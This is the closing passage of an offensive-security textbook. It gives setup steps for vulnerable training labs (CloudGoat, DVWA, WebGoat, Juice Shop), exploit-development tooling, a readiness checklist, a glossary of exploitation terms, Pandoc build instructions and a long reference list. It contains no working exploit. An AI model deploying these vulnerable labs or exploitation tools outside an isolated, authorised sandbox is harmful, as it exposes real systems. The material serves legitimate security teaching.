# follow the workshop scenarios at https://madhuakula.com/kubernetes-goat/
```

### 14. CloudGoat (AWS Vulnerable Lab)

WARNING: deploys real AWS resources that cost real money and *can* be misused. Use a dedicated sandbox AWS account, never your production one. Destroy scenarios after every session.

```bash
git clone https://github.com/RhinoSecurityLabs/cloudgoat ~/lab/cloudgoat
cd ~/lab/cloudgoat
pip install -r requirements.txt

# configure with sandbox AWS credentials
./cloudgoat.py config profile          # asks for AWS profile name
./cloudgoat.py config whitelist --auto # whitelists your IP

# deploy a scenario (start with this one)
./cloudgoat.py create iam_privesc_by_rollback
# read the README in the created directory and follow it

# IMPORTANT
./cloudgoat.py destroy iam_privesc_by_rollback
```

### 15. Web Exploitation Labs

```bash
# OWASP DVWA
docker run --rm -d -p 8080:80 vulnerables/web-dvwa
# http://localhost:8080  (default creds admin/password)

# OWASP WebGoat
docker run -d -p 8080:8080 -p 9090:9090 webgoat/webgoat
# http://localhost:8080/WebGoat

# OWASP Juice Shop
docker run -d -p 3000:3000 bkimminich/juice-shop
# http://localhost:3000

# bWAPP
docker run -d -p 8080:80 raesene/bwapp
```

PortSwigger Web Security Academy lives entirely on portswigger.net — no local setup needed, just register.

### 16. Forensics And Memory Lab

```bash
pip install volatility3

# practice memory images
mkdir -p ~/lab/forensics && cd ~/lab/forensics
# grab samples from:
#   https://github.com/volatilityfoundation/volatility/wiki/Memory-Samples
#   https://cyberdefenders.org/blueteam-ctf-challenges/
```

### 17. Web Recon And Burp Suite

```bash
# Burp Community
# https://portswigger.net/burp/communitydownload — install in lab VM

# alternatives
# Caido: https://caido.io
# OWASP ZAP:
docker run -d -p 8080:8080 -p 8090:8090 zaproxy/zap-stable zap.sh -daemon -host 0.0.0.0
```

### 18. Tmux Workflow Setup

```bash
cat > ~/.tmux.conf <<'EOF'
unbind C-b
set -g prefix C-a
bind C-a send-prefix
set -g mouse on
set -g history-limit 100000
set -g default-terminal "screen-256color"

# nicer status bar
set -g status-bg colour234
set -g status-fg colour250
EOF

tmux new -s pwn
```

A standard pwn-CTF layout:

```text
+-----------------------------+
| pane 1: gdb in target dir   |
+-----------------------------+
| pane 2: vim exploit.py      |
+-----------------------------+
| pane 3: python REPL / shell |
+-----------------------------+
```

### 19. Network Isolation

For deliberately vulnerable code, isolate from the internet:

- **VirtualBox / Vagrant**: use `private_network` only
- **Multipass**: default NAT mode is fine (no inbound exposure)
- **Lima**: bridged network is off by default
- **Docker**: do not use `--network host` for vulnerable services
- **Cloud VMs**: explicit security group, allow your IP only
- **Kubernetes**: run on the local kind cluster, do not expose the kubelet to LAN

### 20. The "Am I Set Up?" Checklist

After completing the relevant sections, you should be able to do all of these. If any fails, fix it now.

- [ ] `pwn template ./vuln` produces a starter exploit script
- [ ] `gdb -q` opens with `pwndbg>` (or `gef>`)
- [ ] `ROPgadget --binary /usr/bin/ls | wc -l` returns thousands
- [ ] `one_gadget /lib/x86_64-linux-gnu/libc.so.6` returns at least one address
- [ ] `checksec --file=/usr/bin/ls` prints a hardening report
- [ ] `cd ~/challenges/rop-emporium/ret2win_64 && ./ret2win` runs (then crashes)
- [ ] `cd ~/challenges/how2heap/glibc_2.31 && ./tcache_poisoning.bin` runs
- [ ] (kernel pwn) QEMU boots a custom kernel with `bzImage + initramfs.cpio.gz`
- [ ] (kernel pwn) `gdb vmlinux` connects to `:1234` and `(gdb) c` continues
- [ ] (container) `docker compose up -d` works for one of the lab files
- [ ] (k8s) `kind create cluster` succeeds, `kubectl get nodes` shows Ready
- [ ] You have at least two named snapshots: `clean-base` and `pwn-tools-installed`

### 21. Snapshot Discipline

Save snapshots at named checkpoints. The minimum set:

- `clean-base` — fresh OS, nothing installed
- `pwn-tools-installed` — toolchain set up
- `kernel-lab-ready` — QEMU + custom kernel building
- `containers-ready` — Docker working with lab compose files
- `k8s-ready` — kind cluster with Goat installed

Restore the closest matching snapshot whenever you need to start an exercise from clean state, or when something feels wrong. Lab hygiene saves more debugging time than any single tool.

### 22. Refresh Cadence

Toolchains rot. Set a recurring monthly task:

```bash
# refresh script — save as ~/bin/lab-refresh.sh
#!/usr/bin/env bash
set -e
cd ~/tools/pwndbg && git pull && ./setup.sh
cd ~/tools/glibc-all-in-one && ./update_list
pip install --upgrade pwntools ropper angr ROPgadget
sudo gem update one_gadget
echo "[+] lab refreshed: $(date)"
```

Run it on the first of each month. The lab stays current; the toolchain stops surprising you.

### 23. Where To Go After Setup

In rough order:

1. Confirm Part 52.20 checklist passes for the lab types you set up
2. Walk through Part 48 (ROP) PoCs section 20 against your local copies of the binaries
3. Walk through Part 49 (cross-class) PoCs in your VM
4. Solve the worked challenges in Part 51 against the binaries you just downloaded
5. Pick a track from Part 50 and start your weekly cadence

The book ends here in earnest. Everything from this point is doing.

## Glossary

This glossary is intentionally short. It is not a replacement for the main chapters, but it gives you a quick anchor when a term reappears later.

- **`AF_ALG`** — a Linux socket family that lets userspace access kernel cryptographic operations.
- **`ASLR`** — Address Space Layout Randomization. Userspace mappings are randomized so attacker addresses cannot be hard-coded.
- **`BTF`** — BPF Type Format. Kernel type information used by many eBPF portability techniques.
- **`canary`** — a value placed near a saved return address; checked on return to detect linear stack overwrites.
- **`capabilities`** — smaller units of privilege that split traditional root power into narrower permissions.
- **`cgroup`** — a Linux mechanism for grouping processes and applying resource control or accounting.
- **`CO-RE`** — Compile Once, Run Everywhere; an eBPF portability approach based on kernel type information.
- **`context`** — the conditions under which code is running, such as process context or interrupt context.
- **`credential state`** — security identity information such as UIDs, GIDs, and capabilities.
- **`drift`** — current system state no longer matching a trusted baseline.
- **`eBPF`** — a verified kernel execution environment used for tracing, filtering, observability, and some policy tasks.
- **`EDR`** — Endpoint Detection and Response. A class of agent that watches a host for malicious activity.
- **`FIM`** — File Integrity Monitoring; recording trusted file state and later checking for unauthorized change.
- **`GFP flags`** — kernel memory-allocation flags that describe allocation behavior and context constraints.
- **`gadget`** — a short instruction sequence ending in `ret` (or jmp/call) used as a building block in ROP.
- **`hook`** — a place where instrumentation or policy code can attach to observe or influence behavior.
- **`IMDS`** — Instance Metadata Service. Cloud endpoint at a fixed link-local address that returns instance credentials.
- **`ioctl`** — a control operation used by drivers and subsystems for commands that do not fit normal read/write behavior.
- **`JOP`** — Jump-Oriented Programming. A code-reuse technique using indirect jumps instead of returns.
- **`KASLR`** — Kernel Address Space Layout Randomization.
- **`KPTI`** — Kernel Page Table Isolation. The Meltdown mitigation that separates user and kernel page tables.
- **`LKM`** — Loadable Kernel Module. Code that extends the running kernel without rebuilding it.
- **`LSM`** — Linux Security Module, such as AppArmor or SELinux.
- **`map`** — a kernel-managed data structure used by eBPF programs to keep state or exchange data with userspace.
- **`mount namespace`** — the namespace that controls which mounted filesystems are visible to a process.
- **`NX`** — No eXecute. Memory pages marked non-executable; defeats injecting code into data regions.
- **`page cache`** — RAM used by the kernel to cache file contents.
- **`PAC`** — Pointer Authentication Codes. ARMv8.3 mitigation that signs pointers with a key in the upper bits.
- **`PIE`** — Position Independent Executable. The main binary is itself loaded at a randomized base.
- **`primitive`** — a security-relevant capability gained by an attacker, such as an information leak or limited write.
- **`process context`** — code running in the context of a schedulable task and often allowed to sleep.
- **`RCU`** — Read-Copy-Update, a synchronization model optimized for heavy reads and deferred freeing.
- **`RELRO`** — RELocation Read-Only. Marks parts of the GOT read-only after dynamic linking.
- **`ring buffer`** — a fast queue-like structure used to pass events from kernel space to userspace.
- **`ROP`** — Return-Oriented Programming. Chaining short gadgets via the stack to compute without injected code.
- **`seccomp`** — a syscall-filtering mechanism.
- **`shadow stack`** — a hardware-protected separate copy of return addresses (Intel CET).
- **`sidecar`** — a separate helper process that performs a specialized function next to a main service or tool.
- **`SMAP`** — Supervisor Mode Access Prevention. Kernel cannot read/write user pages without explicit `stac`/`clac`.
- **`SMEP`** — Supervisor Mode Execution Prevention. Kernel cannot execute user-mode pages.
- **`SROP`** — Sigreturn-Oriented Programming. Restores all registers from a fake sigframe via `sigreturn`.
- **`syscall`** — the formal entry point from userspace into kernel functionality.
- **`tcache`** — per-thread cache in glibc's heap; small free chunks are kept here for fast reuse.
- **`tracepoint`** — a predefined, relatively stable observation point in the kernel.
- **`use-after-free`** — a bug where code continues to use an object after that object has been freed.
- **`userspace`** — normal application space outside the kernel.
- **`VFS`** — the Virtual Filesystem Switch, the common file layer that sits in front of specific filesystems.
- **`virtual address space`** — the address view a process believes it has, translated by the kernel and CPU into physical memory underneath.

## How To Build This Book As EPUB Or PDF

This Markdown source is pure CommonMark; book metadata lives in a sibling `metadata.yaml`. The recommended Pandoc invocations are below.

Files expected in the same directory:

```text
book.md           # this file (pure Markdown, no frontmatter)
metadata.yaml     # title, author, fonts, ToC depth, etc.
book.css          # reading stylesheet (starter below)
cover.jpg         # 1600×2560 cover image (optional but recommended)
```

### EPUB

```bash
pandoc book.md \
  --metadata-file=metadata.yaml \
  --to=epub3 \
  --output=book.epub \
  --toc --toc-depth=2 \
  --top-level-division=chapter \
  --css=book.css \
  --epub-cover-image=cover.jpg \
  --highlight-style=tango
```

What each option does:

- `--metadata-file=metadata.yaml` — loads title, author, fonts, ToC depth, and other Pandoc settings from the external YAML file (keeps `book.md` pure Markdown)
- `--top-level-division=chapter` — treats `##` (Part) as a chapter, so each Part becomes its own EPUB navigation entry and renders as a separate XHTML file inside the book
- `--toc --toc-depth=2` — generates a navigable table of contents up to Part level (so individual sub-sections do not clutter the nav drawer)
- `--css=book.css` — applies your reading stylesheet (a starter is below)
- `--epub-cover-image=cover.jpg` — supply a 1600×2560 cover image for an attractive shelf entry
- `--highlight-style=tango` — readable code-block syntax highlighting; alternatives: `pygments`, `kate`, `breezedark`, `monochrome`

### PDF (via LaTeX)

```bash
pandoc book.md \
  --metadata-file=metadata.yaml \
  --to=pdf \
  --output=book.pdf \
  --toc --toc-depth=2 \
  --top-level-division=chapter \
  --pdf-engine=xelatex \
  --highlight-style=tango
```

If you do not have XeLaTeX, use `--pdf-engine=lualatex` or `--pdf-engine=tectonic`.

### MOBI (For Older Kindles)

EPUB is the modern Kindle format; modern Send-to-Kindle accepts EPUB directly. For older devices use Calibre to convert:

```bash
ebook-convert book.epub book.mobi
```

### Recommended `book.css` Starter

Save this alongside `book.md` as `book.css`:

```css
body {
  font-family: "Linux Libertine O", Georgia, serif;
  line-height: 1.55;
  margin: 0 auto;
  max-width: 38em;
}
h1, h2, h3, h4 {
  font-family: "Helvetica Neue", "Inter", sans-serif;
  line-height: 1.25;
  margin-top: 1.6em;
}
h1 { font-size: 2.0em; border-bottom: 2px solid #333; padding-bottom: 0.2em; }
h2 { font-size: 1.55em; border-bottom: 1px solid #999; padding-bottom: 0.15em; }
h3 { font-size: 1.20em; color: #444; }
h4 { font-size: 1.05em; color: #555; }
code, pre, kbd {
  font-family: "DejaVu Sans Mono", "Menlo", "Consolas", monospace;
  font-size: 0.92em;
}
pre {
  background: #f4f4f4;
  border-left: 3px solid #888;
  padding: 0.6em 0.9em;
  overflow-x: auto;
  page-break-inside: avoid;
}
code { background: #f4f4f4; padding: 0 0.25em; border-radius: 2px; }
blockquote {
  border-left: 4px solid #888;
  background: #fafafa;
  padding: 0.4em 0.9em;
  margin-left: 0;
  font-style: italic;
}
table { border-collapse: collapse; margin: 1em 0; }
th, td { border: 1px solid #aaa; padding: 0.4em 0.7em; }
th { background: #eee; }
a { color: RoyalBlue; text-decoration: none; }
a:hover { text-decoration: underline; }
@media (prefers-color-scheme: dark) {
  body { color: #ddd; background: #1c1c1c; }
  h1 { border-color: #aaa; }
  h2 { border-color: #666; }
  pre, code { background: #2a2a2a; }
  blockquote { background: #222; border-color: #555; }
  th { background: #333; }
}
```

### Cover Image

Create a 1600×2560 JPEG cover (2:3.2 aspect ratio for Amazon and most readers). A simple title card with the book title, subtitle, and author works well. Save as `cover.jpg`.

### Verifying The Output

```bash
# inspect EPUB structure
unzip -l book.epub | head -40
# verify with epubcheck
epubcheck book.epub
```

`epubcheck` (Java tool from W3C) catches accessibility and structural issues. Most errors are CSS or image references; the source Markdown rarely produces verifier failures.

### Reading-Friendly Defaults

A few small things make the reading experience much better on phones and e-readers:

- keep paragraphs under ~6 lines on a 38em column
- prefer tables over wide multi-column code blocks
- code samples should fit in 80 characters when possible
- never embed screenshots of code; always include the text
- use `**bold**` for vocabulary, `*italic*` for emphasis, ``` `monospace` ``` for literal names

This source already follows those conventions.

## External References

A consolidated list of resources cited throughout the book. Companion-text material first, then primary references by topic.

### Companion Books Used Throughout

- Kaiwan N. Billimoria, *Linux Kernel Programming*, Packt, 2nd ed., 2024 — the primary kernel-development companion text
- Google Books listing for *Linux Kernel Programming*
- Packt public code repository for *Linux Kernel Programming*

### Author's Companion Material

- https://lori.my.id/posts/copy-fail-cornela/ — the original Copy Fail (CVE-2026-31431) writeup that motivated Parts 11, 12, and the Cornela case study
- Cornela source repository (this directory) — the practical implementation referenced in Parts 15–17 and Part 26

### Linux Kernel Documentation And Cross-References

- kernel.org `Documentation/` tree — authoritative reference for every subsystem
- LWN.net (lwn.net) — weekly long-form kernel coverage; the single best running source on Linux internals
- Bootlin Elixir Cross-Referencer (elixir.bootlin.com) — searchable kernel source viewer
- The Linux Programming Interface (man7.org/tlpi) — Michael Kerrisk's reference site
- man7.org/linux/man-pages — canonical Linux manual pages

### Kernel Books Beyond The Companion

- Robert Love, *Linux Kernel Development*, 3rd ed.
- Daniel P. Bovet & Marco Cesati, *Understanding the Linux Kernel*, 3rd ed.
- Wolfgang Mauerer, *Professional Linux Kernel Architecture*
- Jonathan Corbet et al., *Linux Device Drivers*, 3rd ed. (free online at lwn.net/Kernel/LDD3/)

### eBPF And Observability

- Liz Rice, *Learning eBPF*, O'Reilly, 2023
- Andrii Nakryiko's libbpf documentation (libbpf.readthedocs.io) and blog posts
- Brendan Gregg, *BPF Performance Tools*, Addison-Wesley, 2019
- Brendan Gregg, *Systems Performance*, 2nd ed., Pearson, 2020
- ebpf.io — community portal with curated tutorials and project links
- Cilium documentation (docs.cilium.io)
- Tetragon documentation (tetragon.io)
- bpftrace reference guide (github.com/bpftrace/bpftrace/blob/master/man/adoc/bpftrace.adoc)

### Binary Exploitation, ROP, And Heap

- Hovav Shacham, *The Geometry of Innocent Flesh on the Bone: Return-into-libc without Function Calls (on the x86)*, ACM CCS 2007 — the foundational ROP paper (Part 48)
- Erik Bosman & Herbert Bos, *Framing Signals — A Return to Portable Shellcode*, IEEE S&P 2014 — the SROP paper (Part 48.11)
- Andrea Bittau et al., *Hacking Blind*, IEEE S&P 2014 — the BROP paper (Part 48.13)
- Anley, Heasman, Lindner, Richarte, *The Shellcoder's Handbook*, 2nd ed., Wiley, 2007
- Bratus et al., *The Art of Software Security Assessment*, Addison-Wesley, 2006
- Shellphish how2heap (github.com/shellphish/how2heap) — canonical heap-technique reference
- ROP Emporium (ropemporium.com) — ten-level ROP curriculum

### Container And Kubernetes Security

- Liz Rice, *Container Security*, O'Reilly, 2020
- Kubernetes documentation (kubernetes.io/docs)
- Kubernetes Goat (madhuakula.com/kubernetes-goat) — vulnerable training cluster
- Bishop Fox "Bad Pods" catalog (github.com/BishopFox/badPods)
- CIS Kubernetes Benchmark (cisecurity.org)
- NSA/CISA Kubernetes Hardening Guide

### Cloud And Supply Chain

- AWS Security Documentation (docs.aws.amazon.com/security)
- GCP Security Documentation (cloud.google.com/security)
- Azure Security Documentation (learn.microsoft.com/security)
- Rhino Security Labs AWS privilege escalation research (rhinosecuritylabs.com)
- flAWS / flAWS2 (flaws.cloud / flaws2.cloud) — guided AWS exercises
- CloudGoat (github.com/RhinoSecurityLabs/cloudgoat) — vulnerable AWS scenarios
- SLSA (slsa.dev) — supply chain integrity framework
- Sigstore documentation (docs.sigstore.dev)
- in-toto specification (in-toto.io)

### Detection Engineering And Threat Frameworks

- MITRE ATT&CK (attack.mitre.org) — the technique taxonomy used throughout Part 44
- MITRE D3FEND (d3fend.mitre.org) — defensive technique catalog
- Sigma rule format (github.com/SigmaHQ/sigma)
- Falco rules (falco.org/docs/rules/)
- Atomic Red Team (atomicredteam.io)
- MITRE Caldera (caldera.mitre.org)

### Vulnerability Research And Fuzzing

- xairy/linux-kernel-exploitation (github.com/xairy/linux-kernel-exploitation) — public kernel exploit index with writeups
- a13xp0p0v "Linux Kernel Defense Map" (github.com/a13xp0p0v/linux-kernel-defence-map) — visualization of mitigations and bypasses
- syzkaller (github.com/google/syzkaller) — kernel fuzzer
- Google kernelCTF (google.github.io/security-research/kernelctf/rules.html)
- AFL++ (github.com/AFLplusplus/AFLplusplus)
- libFuzzer documentation (llvm.org/docs/LibFuzzer.html)
- OSS-Fuzz (google.github.io/oss-fuzz/)
- midas's Linux kernel pwn series (midas.cool)
- lkmidas/Linux-Kernel-Exploitation-Tutorial (github.com/lkmidas/Linux-Kernel-Exploitation-Tutorial)

### Practice Platforms (Cross-References Part 50)

- pwn.college (pwn.college) — university-grade curriculum
- picoCTF (picoctf.org)
- pwnable.kr (pwnable.kr)
- pwnable.tw (pwnable.tw)
- HackTheBox (hackthebox.com)
- TryHackMe (tryhackme.com)
- OverTheWire (overthewire.org)
- CTFtime (ctftime.org)
- microcorruption (microcorruption.com)
- crackmes.one
- PortSwigger Web Security Academy (portswigger.net/web-security)
- CryptoHack (cryptohack.org)
- CryptoPals (cryptopals.com)
- CyberDefenders (cyberdefenders.org) — blue-team challenges
- Iximiuz Labs (labs.iximiuz.com) — interactive container/K8s scenarios

### Tooling Referenced In Parts 31, 45, 52

- pwntools (docs.pwntools.com)
- pwndbg (github.com/pwndbg/pwndbg)
- GEF (github.com/hugsy/gef)
- ROPgadget (github.com/JonathanSalwan/ROPgadget)
- ropper (github.com/sashs/ropper)
- one_gadget (github.com/david942j/one_gadget)
- pwninit (github.com/io12/pwninit)
- glibc-all-in-one (github.com/matrix1001/glibc-all-in-one)
- checksec.sh (github.com/slimm609/checksec.sh)
- Ghidra (ghidra-sre.org)
- radare2 / rizin / Cutter (rizin.re)
- angr (angr.io)
- Volatility 3 (volatilityfoundation.org)
- YARA (virustotal.github.io/yara/)
- bpftool (kernel.org tree, `tools/bpf/bpftool`)
- bpftrace (bpftrace.org)
- Cilium (cilium.io), Tetragon (tetragon.io), Tracee (github.com/aquasecurity/tracee), Falco (falco.org)

### Security Research Blogs Worth Following

- Project Zero (googleprojectzero.blogspot.com)
- Grsecurity blog (grsecurity.net/blog)
- Google Security Research (security.googleblog.com)
- LWN Security articles (lwn.net/Security/)
- xairy's blog (xairy.io)
- a13xp0p0v's writings (a13xp0p0v.github.io)
- Phrack archives (phrack.org)
- PaX Team / spender historical writings
- Aqua Nautilus research (blog.aquasec.com)
- Sysdig research (sysdig.com/blog)
- Wiz research (wiz.io/blog)

### Mailing Lists And Disclosure Channels

- Linux Kernel Mailing List archive (lkml.org)
- oss-security mailing list (openwall.com/lists/oss-security/)
- linux-distros mailing list (private; via openwall.com)
- stable@vger.kernel.org announcements
- Distro security trackers: security-tracker.debian.org, ubuntu.com/security/notices, access.redhat.com/security/security-updates

### Conferences (Recordings Worth Watching)

- Linux Plumbers Conference (linuxplumbersconf.org)
- Kernel Recipes (kernel-recipes.org)
- Linux Security Summit (events.linuxfoundation.org)
- Black Hat (blackhat.com) and DEF CON (defcon.org)
- OffensiveCon (offensivecon.org)
- Recon (recon.cx)
- USENIX Security and OSDI (usenix.org)
- eBPF Summit (ebpf.io/summit-2024/)
- KubeCon + CloudNativeCon (events.linuxfoundation.org/kubecon-cloudnativecon-north-america)

### Standards And Compliance References

- NIST SP 800-53, SP 800-190 (container security), SP 800-204 (microservices), SP 800-193 (firmware resilience)
- CIS Benchmarks (cisecurity.org/cis-benchmarks)
- OWASP Top 10 (owasp.org/www-project-top-ten)
- OWASP Cheat Sheet Series (cheatsheetseries.owasp.org)

---

The book is intentionally a *reading list with a teaching path through it*. If you read through every Part once and then work through ten or twenty entries from this references list over the next two years, you will be in a different place professionally than where you started.
